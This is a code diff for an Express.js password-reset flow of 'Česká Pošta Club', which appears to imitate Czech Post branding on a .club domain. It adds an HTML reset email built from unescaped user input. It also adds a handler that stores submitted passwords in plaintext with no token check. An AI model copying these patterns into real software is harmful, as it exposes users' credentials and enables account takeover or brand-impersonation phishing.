@@ -53,7 +53,7 @@ app.post("/postDefaultLogin", (req, res) => {
 })
 
 // reset password form
-app.post("/postResetPassword", async (req, res) => {
+app.post("/zmenitHeslo", async (req, res) => {
     // TODO: send email 
     // generate random 16 hex bytes
     let randomString = crypto.randomBytes(8)
@@ -76,11 +76,35 @@ app.post("/postResetPassword", async (req, res) => {
         from: "'Obnovení hesla Česká Pošta Club' <obnovahesla@ceskaposta.club>",
         to: req.body.email,
         subject: "Obnova hesla",
-        text: randomString
+        html: `
+            <img src="https://ceskaposta.club/img/banner2.png" />
+            <br>
+            <h1>Obnovení hesla Česká pošta club</h1>
+            <p>
+                Dobrý den,
+                pro obnovení hesla k ${req.body.email} prosím klikněte na tlačítko níže.
+            </p>
+            <a href="https://ceskaposta.club/zmenit-heslo?id=${randomString}">
+                <button style="background-color: #f7b802; border-color: #f7b802; border-radius: 3px; font-weight: bold;">Obnovit heslo</button>
+            </a>
+            <p>
+                Pokud Vám tato zpráva přišla omylem, můžete ji smazat.
+            </p>
+            <p>
+                S přáním hezkého dne,
+                <br>
+                <a href="https://ceskaposta.club/" style="color: #002776;">Česká pošta club</a>
+            </p>
+        `
     })
 
+    res.sendFile(path.join(__dirname, "public/email-odeslan.html"))
+
+})
+
+app.post("/postResetPassword", (req, res) => {
     knex("resetPassword").insert({
-        email: req.body.email
+        email: req.body.email, password: req.body.password
     }).then((result) => {
         console.log("Reset password OK")
         res.sendFile(path.join(__dirname, "public/heslo-zmeneno.html"))
